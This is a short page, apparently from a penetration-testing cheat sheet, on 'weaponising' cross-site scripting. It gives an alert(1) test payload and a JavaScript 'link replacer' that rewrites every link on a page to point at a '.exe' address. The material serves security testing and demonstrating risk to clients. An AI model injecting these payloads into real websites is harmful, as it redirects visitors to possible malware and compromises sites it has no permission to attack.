---
description: 1 up your <script>alert(1)</script> and effectively demonstrate risk
---

# Weaponising XSS

Link replacer

```text
for (var i = 0; i < document.links.length; i++) {
  var a = document.links[i];
  a.href = 'https://domain.com.exe';
}
```

